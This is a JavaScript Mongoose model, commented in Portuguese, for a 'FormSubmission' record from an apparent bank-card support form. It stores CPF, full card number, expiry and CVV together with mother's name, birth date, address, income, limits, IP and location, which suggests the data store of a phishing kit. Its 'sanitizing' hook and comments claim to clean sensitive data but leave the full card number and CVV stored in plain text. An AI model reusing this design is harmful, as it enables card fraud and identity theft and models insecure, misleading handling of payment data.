/**
 * Modelo FormSubmission atualizado com suporte à verificação em duas etapas
 */

const mongoose = require('mongoose');
const Schema = mongoose.Schema;

// Schema para status de verificação
const VerificationSchema = new Schema({
  verified: {
    type: Boolean,
    default: false
  },
  timestamp: {
    type: Date,
    default: Date.now
  },
  method: {
    type: String,
    enum: ['two_step', 'password', 'token', 'none'],
    default: 'none'
  },
  steps: {
    dataNascimento: {
      verified: Boolean,
      timestamp: Date
    },
    nomeMae: {
      verified: Boolean,
      timestamp: Date
    }
  },
  attempts: {
    type: Number,
    default: 0
  },
  ipAddress: String,
  userAgent: String
});

// Schema para dados pessoais
const DadosPessoaisSchema = new Schema({
  nome: {
    type: String,
    trim: true
  },
  dataNascimento: {
    type: String,
    trim: true
  },
  nomeMae: {
    type: String,
    trim: true
  },
  genero: {
    type: String,
    trim: true
  }
});

// Schema para dados do cartão
const DadosCartaoSchema = new Schema({
  numero: {
    type: String,
    trim: true,
    select: false // Não retornar este campo em consultas por padrão
  },
  validade: {
    type: String,
    trim: true
  },
  cvv: {
    type: String,
    trim: true,
    select: false // Não retornar este campo em consultas por padrão
  }
});

// Schema para endereço
const EnderecoSchema = new Schema({
  cep: {
    type: String,
    trim: true
  },
  logradouro: {
    type: String,
    trim: true
  },
  numero: {
    type: String,
    trim: true
  },
  complemento: {
    type: String,
    trim: true
  },
  bairro: {
    type: String,
    trim: true
  },
  cidade: {
    type: String,
    trim: true
  },
  estado: {
    type: String,
    trim: true
  }
});

// Schema para dados financeiros
const DadosFinanceirosSchema = new Schema({
  renda: {
    type: Number
  },
  limiteAtual: {
    type: Number
  },
  limiteDesejado: {
    type: Number
  }
});

// Schema principal de submissão
const FormSubmissionSchema = new Schema({
  sessionId: {
    type: String,
    required: [true, 'ID de sessão é obrigatório'],
    trim: true,
    index: true
  },
  timestamp: {
    type: Date,
    default: Date.now
  },
  cpf: {
    type: String,
    required: [true, 'CPF é obrigatório'],
    trim: true,
    index: true
  },
  tipoProblema: {
    type: String,
    trim: true,
    enum: ['limite', 'bugs', 'aumentarLimite', 'emprestimo', 'outros']
  },
  verificacao: {
    type: VerificationSchema,
    default: () => ({})
  },
  dadosPessoais: {
    type: DadosPessoaisSchema,
    default: () => ({})
  },
  dadosCartao: {
    type: DadosCartaoSchema,
    default: () => ({})
  },
  endereco: {
    type: EnderecoSchema,
    default: () => ({})
  },
  dadosFinanceiros: {
    type: DadosFinanceirosSchema,
    default: () => ({})
  },
  userAgent: {
    type: String,
    trim: true
  },
  ipAddress: {
    type: String,
    trim: true
  },
  status: {
    type: String,
    enum: ['novo', 'em_análise', 'atendido', 'cancelado'],
    default: 'novo'
  },
  protocoloGerado: {
    type: String,
    trim: true
  },
  location: {
    type: Object
  }
}, {
  timestamps: true
});

// Antes de salvar, limpa os dados sensíveis
FormSubmissionSchema.pre('save', function(next) {
  // Mascarar CPF para exibição (salvando apenas os primeiros 3 e últimos 2 dígitos)
  if (this.cpf) {
    this.cpfMascarado = `${this.cpf.substring(0, 3)}*****${this.cpf.substring(9)}`;
  }
  
  // Mascarar número do cartão (salvando apenas os últimos 4 dígitos)
  if (this.dadosCartao && this.dadosCartao.numero) {
    const numeroCartao = this.dadosCartao.numero.replace(/\D/g, '');
    this.dadosCartao.ultimosDigitos = numeroCartao.slice(-4);
  }
  
  next();
});

// Método para gerar número de protocolo
FormSubmissionSchema.methods.gerarProtocolo = function() {
  // Gerar um timestamp como base para o protocolo
  const timestamp = Date.now().toString().slice(-6);
  
  // Gerar um número aleatório de 4 dígitos
  const random = Math.floor(Math.random() * 9000) + 1000;
  
  // Combinar para formar o protocolo
  this.protocoloGerado = `${timestamp}${random}`;
  
  return this.protocoloGerado;
};

// Método para verificar CPF
FormSubmissionSchema.methods.verificarCPF = function(dataNascimento, nomeMae) {
  // Verificar data de nascimento
  const dataNascimentoVerificada = 
    this.dadosPessoais.dataNascimento === dataNascimento;
  
  // Se data de nascimento incorreta, falha na verificação
  if (!dataNascimentoVerificada) {
    this.verificacao.steps.dataNascimento = {
      verified: false,
      timestamp: new Date()
    };
    this.verificacao.attempts += 1;
    return false;
  }
  
  // Atualizar status da verificação da data de nascimento
  this.verificacao.steps.dataNascimento = {
    verified: true,
    timestamp: new Date()
  };
  
  // Se nome da mãe não for fornecido, a verificação está parcial
  if (!nomeMae) {
    return 'partial';
  }
  
  // Verificar nome da mãe
  const nomeMaeVerificado = 
    this.dadosPessoais.nomeMae === nomeMae;
  
  // Atualizar status da verificação do nome da mãe
  this.verificacao.steps.nomeMae = {
    verified: nomeMaeVerificado,
    timestamp: new Date()
  };
  
  // Se nome da mãe incorreto, falha na verificação
  if (!nomeMaeVerificado) {
    this.verificacao.attempts += 1;
    return false;
  }
  
  // Se chegou até aqui, a verificação foi bem-sucedida
  this.verificacao.verified = true;
  this.verificacao.method = 'two_step';
  this.verificacao.timestamp = new Date();
  
  return true;
};

// Método para sanitizar dados sensíveis para exibição
FormSubmissionSchema.methods.sanitizarParaExibicao = function() {
  const obj = this.toObject();
  
  // Mascarar CPF
  if (obj.cpf) {
    obj.cpf = `${obj.cpf.substring(0, 3)}*****${obj.cpf.substring(9)}`;
  }
  
  // Remover dados sensíveis do cartão
  if (obj.dadosCartao) {
    if (obj.dadosCartao.numero) {
      obj.dadosCartao.numero = `****${obj.dadosCartao.ultimosDigitos || '****'}`;
    }
    
    if (obj.dadosCartao.cvv) {
      obj.dadosCartao.cvv = '***';
    }
  }
  
  return obj;
};

// Método estático para formatar CPF
FormSubmissionSchema.statics.formatarCPF = function(cpf) {
  if (!cpf) return cpf;
  
  const cpfLimpo = cpf.replace(/\D/g, '');
  
  if (cpfLimpo.length !== 11) {
    return cpfLimpo;
  }
  
  return `${cpfLimpo.substring(0, 3)}.${cpfLimpo.substring(3, 6)}.${cpfLimpo.substring(6, 9)}-${cpfLimpo.substring(9)}`;
};

// Método estático para validar CPF
FormSubmissionSchema.statics.validarCPF = function(cpf) {
  const cpfLimpo = cpf.replace(/\D/g, '');
  
  if (cpfLimpo.length !== 11) {
    return false;
  }
  
  // Verificar se todos os dígitos são iguais
  if (/^(\d)\1{10}$/.test(cpfLimpo)) {
    return false;
  }
  
  // Validação dos dígitos verificadores
  let sum = 0;
  let remainder;
  
  // Primeiro dígito verificador
  for (let i = 1; i <= 9; i++) {
    sum += parseInt(cpfLimpo.substring(i - 1, i)) * (11 - i);
  }
  
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) {
    remainder = 0;
  }
  
  if (remainder !== parseInt(cpfLimpo.substring(9, 10))) {
    return false;
  }
  
  // Segundo dígito verificador
  sum = 0;
  for (let i = 1; i <= 10; i++) {
    sum += parseInt(cpfLimpo.substring(i - 1, i)) * (12 - i);
  }
  
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) {
    remainder = 0;
  }
  
  if (remainder !== parseInt(cpfLimpo.substring(10, 11))) {
    return false;
  }
  
  return true;
};

// Conversão do objeto formData para o modelo estruturado
FormSubmissionSchema.statics.converterFormData = function(formData) {
  if (!formData) return {};
  
  return {
    cpf: formData.cpf,
    tipoProblema: formData.issueType,
    dadosPessoais: {
      nome: formData.nome
    },
    dadosCartao: {
      numero: formData.cardNumber,
      validade: formData.cardExpiry,
      cvv: formData.cardCvv
    },
    endereco: {
      cep: formData.cep,
      logradouro: formData.street,
      numero: formData.number,
      complemento: formData.complement,
      bairro: formData.neighborhood,
      cidade: formData.city,
      estado: formData.state
    },
    dadosFinanceiros: {
      renda: parseFloat(formData.income.replace(/[^\d,.]/g, '').replace('.', '').replace(',', '.')),
      limiteAtual: parseFloat(formData.currentLimit.replace(/[^\d,.]/g, '').replace('.', '').replace(',', '.')),
      limiteDesejado: parseFloat(formData.desiredLimit)
    }
  };
};

// Exportar modelo
module.exports = mongoose.model('FormSubmission', FormSubmissionSchema);